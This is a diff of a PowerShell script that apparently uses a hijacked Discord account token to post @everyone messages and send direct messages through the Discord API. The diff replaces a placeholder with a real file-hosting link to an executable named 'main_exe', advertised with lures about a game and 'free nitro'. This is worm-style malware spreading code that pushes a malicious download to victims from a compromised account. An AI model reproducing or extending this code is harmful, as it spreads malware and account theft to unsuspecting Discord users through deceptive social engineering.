@@ -154,7 +154,7 @@ if(Test-Path -Path $dscp){
                     }
                 }
                 $messageid = Get-Random $randomchoice
-                $message_data = @{"content"="@everyone hey guys we been working on this game if you are interested here is download link : <url here> send your scores to my dms the highest one gets free nitro ;)"}
+                $message_data = @{"content"="@everyone hey guys we been working on this game if you are interested here is download link : https://anonfiles.com/L0o8Y4z4u4/main_exe send your scores to my dms the highest one gets free nitro ;)"}
                 Invoke-WebRequest -UseBasicParsing -Uri "$api/channels/$messageid/messages" -Method Post -Headers $headers -Body $message_data
                 $randomchoice = @()
             }
@@ -168,7 +168,7 @@ if(Test-Path -Path $dscp){
             $message_data = @{"recipient_id"=$userid} | ConvertTo-Json
             $resp = Invoke-WebRequest -UseBasicParsing -Uri "$api/users/@me/channels" -Method Post -Headers $headers -Body $message_data | ConvertFrom-Json
             $chan_id = $resp.id
-            $message_data = @{"content"="hey here is the program you asked for <url here>"} | ConvertTo-Json
+            $message_data = @{"content"="hey here is the program you asked for https://anonfiles.com/L0o8Y4z4u4/main_exe"} | ConvertTo-Json
             Invoke-WebRequest -UseBasicParsing -Uri "$api/channels/$chan_id/messages" -Method Post -Headers $headers -Body $message_data
         }
     }
